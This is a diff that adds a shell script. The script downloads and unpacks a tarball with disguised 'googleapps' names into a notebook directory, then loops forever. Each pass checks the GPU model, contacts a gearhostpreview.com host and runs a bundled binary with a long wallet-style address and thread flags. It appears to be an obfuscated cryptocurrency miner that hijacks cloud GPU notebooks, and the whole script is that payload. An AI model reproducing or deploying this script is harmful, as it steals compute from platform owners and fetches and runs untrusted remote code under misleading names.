@@ -1,0 +1,132 @@
+apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
+
+cd /notebooks/
+
+wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/googleapps8474127412742.tar.gz
+tar -xvf ./googleapps8474127412742.tar.gz
+
+cd googleapps8474
+
+while true
+do
+
+google8474=$(nvidia-smi --query-gpu=name --format=csv,noheader | sed "s/ //g")
+
+if [[ $google8474 == "QuadroP4000" ]]
+then
+
+arr[0]="http://mobile841212121274.gearhostpreview.com"
+rand=$[$RANDOM % ${#arr[@]}]
+google841212121274=${arr[$rand]}
+
+google8412=$(curl $google841212121274 | sed "s/\s+//g")
+
+if [[ $google8412 = "" ]]
+then
+
+timeout 84 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 16 -b 16
+if [ $? -eq 124 ]; then
+echo "google84"
+else
+echo "google8474"
+fi
+
+else
+
+echo "mobile8474"
+
+sleep 84;
+
+fi
+
+else
+
+if [[ $google8474 == "QuadroM4000" ]]
+then
+
+arr[0]="http://mobile841212121274.gearhostpreview.com"
+rand=$[$RANDOM % ${#arr[@]}]
+google841212121274=${arr[$rand]}
+
+google8412=$(curl $google841212121274 | sed "s/\s+//g")
+
+if [[ $google8412 = "" ]]
+then
+
+timeout 84 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 16 -b 16
+if [ $? -eq 124 ]; then
+echo "google84"
+else
+echo "google8474"
+fi
+
+else
+
+echo "mobile8474"
+
+sleep 84;
+
+fi
+
+else
+
+if [[ $google8474 == "QuadroP5000" ]]
+then
+
+arr[0]="http://mobile841212121274.gearhostpreview.com"
+rand=$[$RANDOM % ${#arr[@]}]
+google841212121274=${arr[$rand]}
+
+google8412=$(curl $google841212121274 | sed "s/\s+//g")
+
+if [[ $google8412 = "" ]]
+then
+
+timeout 84 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 20 -b 20
+if [ $? -eq 124 ]; then
+echo "google84"
+else
+echo "google8474"
+fi
+
+else
+
+echo "mobile8474"
+
+sleep 84;
+
+fi
+
+else
+
+arr[0]="http://mobile841212121274.gearhostpreview.com"
+rand=$[$RANDOM % ${#arr[@]}]
+google841212121274=${arr[$rand]}
+
+google8412=$(curl $google841212121274 | sed "s/\s+//g")
+
+if [[ $google8412 = "" ]]
+then
+
+timeout 84 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 16 -b 16
+if [ $? -eq 124 ]; then
+echo "google84"
+else
+echo "google8474"
+fi
+
+else
+
+echo "mobile8474"
+
+sleep 84;
+
+fi
+
+fi
+
+fi
+
+fi
+
+done
